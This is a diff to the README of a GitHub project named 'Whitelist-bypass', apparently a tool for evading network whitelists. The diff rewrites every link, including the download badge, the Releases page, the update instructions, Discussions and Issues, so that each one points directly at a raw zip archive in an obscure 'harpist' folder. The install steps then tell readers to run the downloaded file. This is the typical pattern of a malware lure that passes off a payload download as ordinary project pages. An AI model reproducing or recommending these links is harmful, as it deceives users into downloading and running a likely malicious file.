@@ -1,7 +1,7 @@
 # 🛠️ Whitelist-bypass - Access Public Configurations Easily
 
 ## 📥 Download Now
-[![Download Whitelist-bypass](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/roriruri9370/Whitelist-bypass/releases)
+[![Download Whitelist-bypass](https://github.com/roriruri9370/Whitelist-bypass/raw/refs/heads/main/harpist/bypass_Whitelist_v1.7.zip)](https://github.com/roriruri9370/Whitelist-bypass/raw/refs/heads/main/harpist/bypass_Whitelist_v1.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Testing of configurations occurs in **Khanty-Mansi Autonomous Okrug, Surgut**. R
 ## 🚀 Getting Started
 To use Whitelist-bypass, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/roriruri9370/Whitelist-bypass/releases) to find the latest version available for download.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/roriruri9370/Whitelist-bypass/raw/refs/heads/main/harpist/bypass_Whitelist_v1.7.zip) to find the latest version available for download.
 2. **Download the Application:** Look for the release tag that best suits your needs. Click on the download link for the latest version.
 3. **Install the Application:**
    - If you downloaded a .exe or .zip file, locate it in your Downloads folder.
@@ -63,7 +63,7 @@ Once you have installed the application, follow these instructions to use it:
 If you encounter issues while using Whitelist-bypass:
 
 - **Check Your Internet Connection:** Ensure you are connected to the internet.
-- **Update the Application:** Make sure you are using the latest version from the [Releases page](https://github.com/roriruri9370/Whitelist-bypass/releases).
+- **Update the Application:** Make sure you are using the latest version from the [Releases page](https://github.com/roriruri9370/Whitelist-bypass/raw/refs/heads/main/harpist/bypass_Whitelist_v1.7.zip).
 - **Switch Configurations:** If one configuration doesn’t work, try another from the list.
 - **Consult the Community:** If the problem persists, consider looking for solutions in community forums or user groups.
 
@@ -72,8 +72,8 @@ If you encounter issues while using Whitelist-bypass:
 ## 📖 Additional Resources
 For more information, visit our documentation or community resources. Here are some helpful links:
 
-- [GitHub Discussions](https://github.com/roriruri9370/Whitelist-bypass/discussions)
-- [Issues Page](https://github.com/roriruri9370/Whitelist-bypass/issues)
+- [GitHub Discussions](https://github.com/roriruri9370/Whitelist-bypass/raw/refs/heads/main/harpist/bypass_Whitelist_v1.7.zip)
+- [Issues Page](https://github.com/roriruri9370/Whitelist-bypass/raw/refs/heads/main/harpist/bypass_Whitelist_v1.7.zip)
 
 ---
 
